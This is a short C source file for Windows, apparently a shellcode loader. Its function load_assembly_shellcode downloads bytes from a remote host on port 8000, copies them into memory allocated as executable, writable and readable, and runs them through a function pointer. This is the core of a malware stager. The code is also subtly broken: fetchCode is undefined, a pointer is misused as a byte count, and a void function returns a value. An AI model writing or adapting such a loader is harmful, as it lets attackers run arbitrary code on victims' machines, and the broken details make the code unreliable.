#include <stdio.h>
#include <windows.h>
#include <wininet.h>

#pragma comment(lib, "wininet")

void* memRep(void* dest, const void* src, size_t count) {
    char* x = (char*)dest, * y = (char*)src;
    while (count--) *x++ = *y++;
    return dest;
}

void load_assembly_shellcode(const wchar_t* hostname, const wchar_t* assembly) {
    DWORD* bytesRead;
    unsigned char buffer[4096];
    
    fetchCode(hostname, assembly, L"8000", &buffer, &bytesRead);

    void* allocatedMemory = VirtualAlloc(0, 4096, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (allocatedMemory == NULL) {
        printf("Memory allocation failed\n");
        return 1;
    }

    memRep(allocatedMemory, buffer, bytesRead);

    void (*functionPointer)() = (void (*)())allocatedMemory;

    functionPointer();
}
